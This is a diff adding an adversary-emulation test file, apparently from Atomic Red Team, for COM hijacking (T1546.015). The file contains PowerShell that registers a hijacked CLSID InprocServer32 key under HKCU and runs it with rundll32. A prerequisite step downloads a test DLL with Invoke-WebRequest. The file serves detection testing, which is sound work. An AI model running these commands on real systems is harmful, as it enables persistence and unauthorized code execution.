@@ -1,0 +1,41 @@
+attack_technique: T1546.015
+display_name: 'Event Triggered Execution: Component Object Model Hijacking'
+atomic_tests:
+- name: COM Hijacking - InprocServer32
+  description: |-
+    This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+    Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+  supported_platforms:
+  - windows
+  input_arguments:
+    clsid_threading:
+      description: Threading Model
+      type: string
+      default: Apartment
+    dllpath:
+      description: Path to the DLL.
+      type: String
+      default: $env:TEMP\AtomicTest.dll
+    clsid:
+      description: Class ID to hijack.
+      type: string
+      default: '{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+    clsid_description:
+      description: Description for CLSID
+      type: string
+      default: MSAA AccPropServices
+  dependency_executor_name: powershell
+  dependencies:
+  - description: DLL For testing
+    prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
+  executor:
+    command: |-
+      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+      New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+      Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+    cleanup_command: |-
+      Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore
+    name: powershell
